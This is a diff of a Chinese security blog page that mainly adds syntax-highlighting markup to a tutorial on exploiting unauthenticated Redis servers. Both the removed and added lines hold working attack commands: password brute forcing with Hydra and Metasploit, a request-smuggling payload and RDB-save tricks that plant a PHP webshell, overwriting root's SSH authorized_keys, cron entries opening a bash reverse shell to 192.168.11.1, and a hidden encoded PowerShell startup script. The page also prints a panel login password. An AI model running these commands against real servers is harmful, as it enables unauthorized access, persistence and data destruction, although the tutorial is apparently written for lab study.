@@ -42,7 +42,8 @@
 	<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/live2d-widget/autoload.js"></script>
 
 <meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Yang Hao's blog" type="application/atom+xml">
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -465,153 +466,153 @@
 <p>3.<a target="_blank" rel="noopener" href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> 是开源的可视化工具，但是新版本的安装包需要付费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p>
 <p>4.<a target="_blank" rel="noopener" href="https://github.com/qishibo/AnotherRedisDesktopManager">AnotherRedisDesktopManager</a>，这是另一个可视化管理工具，开源免费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f198fabfa3bbec5e98742d65133b75af.png"></p>
 <p>5.其他方式<br>其他还可以用NC工具来连接使用。甚至在未授权的情况下还可以用python的urllib2模块的http请求走私特性利用：</p>
-<pre><code class="python"># -*- coding:utf-8 -*-
-import urllib2
-url = "http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?&gt;'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"
-htmlpage = urllib2.urlopen(url).read()
-print(htmlpage)</code></pre>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+<span class="token keyword">import</span> urllib2
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>
+htmlpage <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>htmlpage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般以源码编译方式安装，源码详见：<a target="_blank" rel="noopener" href="https://github.com/redis/redis">Redis仓库</a>     <a target="_blank" rel="noopener" href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p>
 <p>1.先安装下3.2.0版本，观察在3.2.0的默认配置下是否如官网描述的安全性情况：</p>
-<pre><code class="shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz
+<pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz
 $ tar xzf redis-3.2.0.tar.gz
 $ cd redis-3.2.0
 $ make
-$ cd src &amp;&amp; ./redis-server</code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed7c038d7978ce468ce1d0ef7baea7cc.png"><br>这时候使用外部IP连接时果然会提示，所以在Linux版本&gt;=3.2.0以上没有手动配置绑定在外部IP上的话是不能远程利用的(所以后面的需要在配置文件redis.conf中手动配置<code>protected-mode no</code>和<code>bind 0.0.0.0</code>)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f0d65cdb6884b0218f0c93ec285a0b18.png"></p>
 <p>2.安装3.0.7(&lt;3.2.0最近的就是这个了)：</p>
-<pre><code class="shell">$ wget https://download.redis.io/releases/redis-3.0.7.tar.gz
+<pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.0.7.tar.gz
 $ tar xzf redis-3.0.7.tar.gz
 $ cd redis-3.0.7
 $ make
-$ cd src &amp;&amp; ./redis-server</code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c897142bf1526e1e2e2b349066881acb.png"></p>
 <p>3.Redis6.2.6安装</p>
-<pre><code class="shell">$ wget https://download.redis.io/releases/redis-6.2.6.tar.gz
+<pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-6.2.6.tar.gz
 $ tar xzf redis-6.2.6.tar.gz
 $ cd redis-6.2.6
 $ make
-$ cd src &amp;&amp; ./redis-server</code></pre>
+$ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>修改默认配置文件关闭保护模式并绑定IP（<code>bind 0.0.0.0 ，protected-mode no</code>）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1b3d18fc3a70f386bc757c326cc141d7.png"><br>加载配置文件启动<code>./redis-server ../redis.conf</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f226ac8aaadcc072a6caf5ac22e8e01e.png"></p>
 <p>4.Docker 环境<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">vulhub</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed8fb9d44d975a36d16033f3a26f3ab3.png"></p>
 <p><a target="_blank" rel="noopener" href="https://hub.docker.com/_/redis">dockerhub-redis</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p>
-<pre><code class="bash">docker pull redis:5-bullseye</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">docker pull redis:5-bullseye<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9c73d5c602c38d59d9e96092e13ca56e.png"></p>
 <h3 id="Dockerhub-CentOS"><a href="#Dockerhub-CentOS" class="headerlink" title="Dockerhub-CentOS"></a>Dockerhub-CentOS</h3><p>使用Docker在CentOS容器内部署PHPStudy和Redis环境：</p>
-<pre><code class="python">docker pull centos:latest
-docker run -tid --name centos_1 -p 6379:6379 -p 18080:18080 -p 8081:8080 -p 8082:80 -p 9080:9080 -p 2222:22 --privileged=true centos:latest /sbin/init
-yum install crontabs   #安装计划任务服务
-systemctl enable crond #设为开机启动
-systemctl start crond  #启动crond服务
-systemctl status crond #查看状态
+<pre class="line-numbers language-python"><code class="language-python">docker pull centos<span class="token punctuation">:</span>latest
+docker run <span class="token operator">-</span>tid <span class="token operator">-</span><span class="token operator">-</span>name centos_1 <span class="token operator">-</span>p <span class="token number">6379</span><span class="token punctuation">:</span><span class="token number">6379</span> <span class="token operator">-</span>p <span class="token number">18080</span><span class="token punctuation">:</span><span class="token number">18080</span> <span class="token operator">-</span>p <span class="token number">8081</span><span class="token punctuation">:</span><span class="token number">8080</span> <span class="token operator">-</span>p <span class="token number">8082</span><span class="token punctuation">:</span><span class="token number">80</span> <span class="token operator">-</span>p <span class="token number">9080</span><span class="token punctuation">:</span><span class="token number">9080</span> <span class="token operator">-</span>p <span class="token number">2222</span><span class="token punctuation">:</span><span class="token number">22</span> <span class="token operator">-</span><span class="token operator">-</span>privileged<span class="token operator">=</span>true centos<span class="token punctuation">:</span>latest <span class="token operator">/</span>sbin<span class="token operator">/</span>init
+yum install crontabs   <span class="token comment" spellcheck="true">#安装计划任务服务</span>
+systemctl enable crond <span class="token comment" spellcheck="true">#设为开机启动</span>
+systemctl start crond  <span class="token comment" spellcheck="true">#启动crond服务</span>
+systemctl status crond <span class="token comment" spellcheck="true">#查看状态</span>
 yum install wget
-#下载编译好的redis-server到CentOS
-wget http://xxx/redis-server &amp;&amp; chmod +x redis-server &amp;&amp; ./redis-server
-#openssh
-yum install openssh*
+<span class="token comment" spellcheck="true">#下载编译好的redis-server到CentOS</span>
+wget http<span class="token punctuation">:</span><span class="token operator">//</span>xxx<span class="token operator">/</span>redis<span class="token operator">-</span>server <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token operator">+</span>x redis<span class="token operator">-</span>server <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>server
+<span class="token comment" spellcheck="true">#openssh</span>
+yum install openssh<span class="token operator">*</span>
 systemctl enable sshd 
 systemctl start sshd
-#phpstudy，内置了很多软件安装
-yum install -y wget &amp;&amp; wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sh install.sh
-请用浏览器访问面板:
-外网:http://171.212.137.205:9080/B3A929
-内网:http://172.17.0.3:9080/B3A929
-系统初始账号:admin
-系统初始密码:hLQGQ6HGP9
-#ssh -fgN -L 8080:localhost:80 localhost</code></pre>
+<span class="token comment" spellcheck="true">#phpstudy，内置了很多软件安装</span>
+yum install <span class="token operator">-</span>y wget <span class="token operator">&amp;</span><span class="token operator">&amp;</span> wget <span class="token operator">-</span>O install<span class="token punctuation">.</span>sh https<span class="token punctuation">:</span><span class="token operator">//</span>notdocker<span class="token punctuation">.</span>xp<span class="token punctuation">.</span>cn<span class="token operator">/</span>install<span class="token punctuation">.</span>sh <span class="token operator">&amp;</span><span class="token operator">&amp;</span> sh install<span class="token punctuation">.</span>sh
+请用浏览器访问面板<span class="token punctuation">:</span>
+外网<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">171.212</span><span class="token punctuation">.</span><span class="token number">137.205</span><span class="token punctuation">:</span><span class="token number">9080</span><span class="token operator">/</span>B3A929
+内网<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.17</span><span class="token punctuation">.</span><span class="token number">0.3</span><span class="token punctuation">:</span><span class="token number">9080</span><span class="token operator">/</span>B3A929
+系统初始账号<span class="token punctuation">:</span>admin
+系统初始密码<span class="token punctuation">:</span>hLQGQ6HGP9
+<span class="token comment" spellcheck="true">#ssh -fgN -L 8080:localhost:80 localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9345d24c4c1123f0a84def9d60eef471.png"></p>
 <h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p>Windows版本安装包的更新没有Linux那么及时，需要自行编译源码或者使用其他已编译的版本：<a target="_blank" rel="noopener" href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5</a> ， <a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a>，<a target="_blank" rel="noopener" href="https://github.com/tporadowski/redis/releases">Redis 5.0.14</a> 。<br>常用的PHPStudy-Redis3.0.504：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-xx.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p>
 <p>以服务形式启动的默认会加载<code>redis.windows-service.conf</code>，命令行启动的可以手动指定：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/dff88acf2fc35cc9d7c2216dc9cc7b72.png"><br>同样的修改配置文件以允许外部链接：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/df0bb9ebda1c49f38f50fb9ddf626fa7.png"></p>
 <h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><strong>Dict协议</strong></p>
-<pre><code class="python">dict://192.168.200.97:6379/auth:password</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">dict<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">/</span>auth<span class="token punctuation">:</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>Metasploit模块</strong></p>
-<pre><code class="python">use auxiliary/scanner/redis/redis_login
-set rohosts 192.168.11.133
-run</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>redis<span class="token operator">/</span>redis_login
+set rohosts <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9abaff419efd5fc973b2dc0cff95f28.png"></p>
 <p><strong>Hydra</strong></p>
-<pre><code class="stylus">hydra -P redis_pass.txt redis://192.168.11.133</code></pre>
+<pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.11.133</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p>
 <p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p>
 <h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>主要是利用一些命令获取信息，获取客户端连接信息： <code>CLIENT LIST</code><br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"><br> 探测文件是否存在(&gt;2.6.0)：<code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png"></p>
-<pre><code class="python">#检测 redis 服务是否启动
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#检测 redis 服务是否启动</span>
 ping
 
-#查看是否设置了密码验证
+<span class="token comment" spellcheck="true">#查看是否设置了密码验证</span>
 CONFIG get requirepass
 
-#设置密码为runoob
-AUTH "runoob"
+<span class="token comment" spellcheck="true">#设置密码为runoob</span>
+AUTH <span class="token string">"runoob"</span>
 
-#获取 Redis 服务器的各种信息和统计数值
+<span class="token comment" spellcheck="true">#获取 Redis 服务器的各种信息和统计数值</span>
 INFO
 
-#查询配置参数
+<span class="token comment" spellcheck="true">#查询配置参数</span>
 CONFIG GET
 
-#设置配置参数
+<span class="token comment" spellcheck="true">#设置配置参数</span>
 CONFIG STE
 
-#设置KEY"runoobkey"的值为redis 
+<span class="token comment" spellcheck="true">#设置KEY"runoobkey"的值为redis </span>
 SET runoobkey redis
 
-#删除KEY"runoobkey"
+<span class="token comment" spellcheck="true">#删除KEY"runoobkey"</span>
 DEL runoobkey
 
-#在后台异步保存当前数据库的数据到磁盘
+<span class="token comment" spellcheck="true">#在后台异步保存当前数据库的数据到磁盘</span>
 BGSAVE
 
-#返回当前数据库的 key 的数量
+<span class="token comment" spellcheck="true">#返回当前数据库的 key 的数量</span>
 DBSIZE
 
-#让 Redis 服务崩溃
+<span class="token comment" spellcheck="true">#让 Redis 服务崩溃</span>
 DEBUG SEGFAULT
 
-#删除所有数据库的所有key
+<span class="token comment" spellcheck="true">#删除所有数据库的所有key</span>
 FLUSHALL
 
-#删除当前数据库的所有key
+<span class="token comment" spellcheck="true">#删除当前数据库的所有key</span>
 FLUSHDB
 
-#返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示
+<span class="token comment" spellcheck="true">#返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示</span>
 LASTSAVE
 
-#设置远程主服务器
-SLAVEOF host port / REPLICAOF host port 
+<span class="token comment" spellcheck="true">#设置远程主服务器</span>
+SLAVEOF host port <span class="token operator">/</span> REPLICAOF host port 
 
-#断开主从连接
-SLAVEOF ON ONE</code></pre>
+<span class="token comment" spellcheck="true">#断开主从连接</span>
+SLAVEOF ON ONE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p><a target="_blank" rel="noopener" href="https://redis.io/topics/persistence">Redis持久化</a>是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的文件利用。</p>
 <h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><p>基础的命令如下：</p>
-<pre><code class="python">DBSIZE                   # 统计KEYS
-flushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)
-CONFIG GET slave-read-only      # 查询只读配置
-CONFIG SET slave-read-only no    # 关闭只读配置
-CONFIG GET DIR              # 查询目录
-CONFIG SET dir /path/www/html    # 修改备份目录  
-CONFIG GET dbfilename         # 查询备份文件名，方便恢复
-CONFIG SET dbfilename trojan.php  # 修改备份文件名为我们的shell名
-SET trojan "&lt;?php phpinfo(); ?&gt;"  # 设置KEY和值
-BGSAVE  / SAVE              # 异步/阻塞 保存当前数据库的数据到磁盘
-DEL trojan                 #删除恶意键          
+<pre class="line-numbers language-python"><code class="language-python">DBSIZE                   <span class="token comment" spellcheck="true"># 统计KEYS</span>
+flushall                  <span class="token comment" spellcheck="true"># 如果键过多导致备份过大，全部清空KEYS(危险)</span>
+CONFIG GET slave<span class="token operator">-</span>read<span class="token operator">-</span>only      <span class="token comment" spellcheck="true"># 查询只读配置</span>
+CONFIG SET slave<span class="token operator">-</span>read<span class="token operator">-</span>only no    <span class="token comment" spellcheck="true"># 关闭只读配置</span>
+CONFIG GET DIR              <span class="token comment" spellcheck="true"># 查询目录</span>
+CONFIG SET dir <span class="token operator">/</span>path<span class="token operator">/</span>www<span class="token operator">/</span>html    <span class="token comment" spellcheck="true"># 修改备份目录  </span>
+CONFIG GET dbfilename         <span class="token comment" spellcheck="true"># 查询备份文件名，方便恢复</span>
+CONFIG SET dbfilename trojan<span class="token punctuation">.</span>php  <span class="token comment" spellcheck="true"># 修改备份文件名为我们的shell名</span>
+SET trojan <span class="token string">"&lt;?php phpinfo(); ?>"</span>  <span class="token comment" spellcheck="true"># 设置KEY和值</span>
+BGSAVE  <span class="token operator">/</span> SAVE              <span class="token comment" spellcheck="true"># 异步/阻塞 保存当前数据库的数据到磁盘</span>
+DEL trojan                 <span class="token comment" spellcheck="true">#删除恶意键          </span>
 恢复：
-CONFIG SET dir /usr/local/redis   #恢复原来的目录
-CONFIG SET dbfilename dump.rdb   # 恢复原来的备份文件</code></pre>
+CONFIG SET dir <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>redis   <span class="token comment" spellcheck="true">#恢复原来的目录</span>
+CONFIG SET dbfilename dump<span class="token punctuation">.</span>rdb   <span class="token comment" spellcheck="true"># 恢复原来的备份文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h5 id="Linux写SSH公钥"><a href="#Linux写SSH公钥" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h5><p><em>需要有对应用户目录的写入权限且ssh服务可以连接并开启了公钥登录，在Ubuntu上用Redis3.0.7测试</em><br>生成密钥对： <code>ssh-keygen -t rsa</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee761b74f8d31b1b0843204eea9ec020.png"><br>在id_rsa.pub文件中首尾加上换行(复制完记得改回去)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e74eff4168d783708cb94706a97d09a.png"><br>执行下列命令</p>
-<pre><code class="python">config set dir /root/.ssh
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh
 config set dbfilename authorized_keys
-set authorized_keys "id_rsa.pub的内容"
-bgsave</code></pre>
+set authorized_keys <span class="token string">"id_rsa.pub的内容"</span>
+bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a88d17df4b2feb84d5ba54c964384dd3.png"><br>查看靶机已经写入成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d71634977764e04614840a94d832ea2d.png"><br>登录成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9a696a39954a3c85bcc4f66dd9d2ad0.png"></p>
 <h5 id="Linux写计划任务"><a href="#Linux写计划任务" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h5><p>Linux下操作计划任务需要root权限。<a target="_blank" rel="noopener" href="https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/">计划任务介绍</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6">crontab文件</a></p>
 <p><code>/etc/crontab</code>和<code>/etc/cron.*</code>目录下的任务时间表（crontabs）文件是系统层次的，格式如下：</p>
-<pre><code class="bash"># 文件格式说明
-# ┌──分钟（0 - 59）
-# │ ┌──小时（0 - 23）
-# │ │ ┌──日（1 - 31）
-# │ │ │ ┌─月（1 - 12）
-# │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）
-# │ │ │ │ │
-# *  *  *  *  *  用户名 执行的命令</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式说明</span>
+<span class="token comment" spellcheck="true"># ┌──分钟（0 - 59）</span>
+<span class="token comment" spellcheck="true"># │ ┌──小时（0 - 23）</span>
+<span class="token comment" spellcheck="true"># │ │ ┌──日（1 - 31）</span>
+<span class="token comment" spellcheck="true"># │ │ │ ┌─月（1 - 12）</span>
+<span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span>
+<span class="token comment" spellcheck="true"># │ │ │ │ │</span>
+<span class="token comment" spellcheck="true"># *  *  *  *  *  用户名 执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。</p>
 <table>
 <thead>
@@ -648,124 +649,124 @@ bgsave</code></pre>
 </tr>
 </tbody></table>
 <p><code>/var/spool/cron/</code>下的任务时间表（crontab）文件是用户层次的（但是只能root权限建），计划任务文件的名称与用户的用户名相同，格式如下：</p>
-<pre><code class="bash"># 文件格式说明
-# ┌──分钟（0 - 59）
-# │ ┌──小时（0 - 23）
-# │ │ ┌──日（1 - 31）
-# │ │ │ ┌─月（1 - 12）
-# │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）
-# │ │ │ │ │
-# *  *  *  *  * 被执行的命令</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式说明</span>
+<span class="token comment" spellcheck="true"># ┌──分钟（0 - 59）</span>
+<span class="token comment" spellcheck="true"># │ ┌──小时（0 - 23）</span>
+<span class="token comment" spellcheck="true"># │ │ ┌──日（1 - 31）</span>
+<span class="token comment" spellcheck="true"># │ │ │ ┌─月（1 - 12）</span>
+<span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span>
+<span class="token comment" spellcheck="true"># │ │ │ │ │</span>
+<span class="token comment" spellcheck="true"># *  *  *  *  * 被执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于Ubuntu的计划任务不能容错，语法会进行严格检查:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>所以写计划任务用到了Docker搭建CentOS环境来测试，Redis命令写入计划任务文件夹<code>/etc/cron.d</code>：</p>
-<pre><code class="bash">config set dir /etc/cron.d
-config set dbfilename x
-set x "\n\nSHELL=/bin/bash\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"
-#set x "\n\n* * * * * ftp bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"
-save</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">config <span class="token keyword">set</span> <span class="token function">dir</span> /etc/cron.d
+config <span class="token keyword">set</span> dbfilename x
+<span class="token keyword">set</span> x <span class="token string">"\n\nSHELL=/bin/bash\n\n* * * * * root bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
+<span class="token comment" spellcheck="true">#set x "\n\n* * * * * ftp bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a01700f56255272f2e5657941c08f9f3.png"></p>
 <p>写入 <code>/var/spool/cron/</code>：</p>
-<pre><code class="bash">FLUSHALL
-config set dir /var/spool/cron
-config set dbfilename bin  # 以用户名命名文件
-set x "\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"
-save</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">FLUSHALL
+config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron
+config <span class="token keyword">set</span> dbfilename bin  <span class="token comment" spellcheck="true"># 以用户名命名文件</span>
+<span class="token keyword">set</span> x <span class="token string">"\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>反弹回bin用户的shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c5f026052faf1c2c331f8c88d055d30a.png"></p>
 <h5 id="Windows写启动项"><a href="#Windows写启动项" class="headerlink" title="Windows写启动项"></a>Windows写启动项</h5><p>通过文件写入启动项后，在系统重启后执行脚本，主要是写.bat .cmd等支持容错的文件执行其他命令(powershell、mshta、regsvr32等等)来利用(windows下换行<code>\r\n</code>)：</p>
-<pre><code class="python"># 这是系统启动项，如果权限不足时利用set dir或EVAL "return dofile"目录/文件探测方式去找用户启动目录
-config set dir "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" 
-config set dbfilename info.bat
-set x "\r\n\r\npowershell.exe -nop -w hidden -enc xxxxx\r\n\r\n"
-save</code></pre>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 这是系统启动项，如果权限不足时利用set dir或EVAL "return dofile"目录/文件探测方式去找用户启动目录</span>
+config set dir <span class="token string">"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"</span> 
+config set dbfilename info<span class="token punctuation">.</span>bat
+set x <span class="token string">"\r\n\r\npowershell.exe -nop -w hidden -enc xxxxx\r\n\r\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/744be6544214bae378f65fce5ee066d8.png"></p>
